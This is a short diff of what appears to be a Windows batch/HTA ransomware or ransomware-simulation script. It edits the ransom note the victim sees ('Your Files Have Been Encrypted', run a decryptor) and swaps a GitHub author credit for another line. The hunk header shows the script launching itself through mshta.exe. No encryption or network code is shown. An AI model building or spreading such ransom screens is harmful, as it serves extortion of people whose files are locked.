@@ -117,9 +117,9 @@ for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
 <div id="texto2">
     Oops, Your Files Have Been Encrypted!<br>
     <br><br>
-    Now you need run RamonDecryptor, be careful next time<br>
+    Now you need run Decryptor, be careful next time<br>
     <br><br>
-   Github.com/SegoCode<br>
+  Nfire mio padre<br>
     <br><br><br>
     <img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
 </div>
